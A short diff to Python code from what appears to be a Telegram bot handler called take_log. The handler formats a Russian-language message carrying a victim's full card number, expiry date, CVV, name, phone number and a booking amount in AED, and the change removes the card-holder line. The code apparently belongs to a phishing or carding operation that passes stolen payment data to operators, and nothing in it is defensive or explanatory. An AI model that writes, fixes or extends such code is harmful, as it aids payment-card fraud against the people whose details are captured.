@@ -159,8 +159,7 @@ async def take_log(callback: types.CallbackQuery):
             f"💳  Карта: {card.get('full_pan')}\n"
             f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
             f"🔒  CVV: {card.get('cvv')}\n"
-            f"🆔  Владелец: {card.get('card_holder')}\n\n"
-            f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n"
+            f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n\n"
             f"📞  Номер: {customer.get('phone')}\n\n"
             f"💸  Сумма: {booking.get('total_amount')}.00 AED"
         )
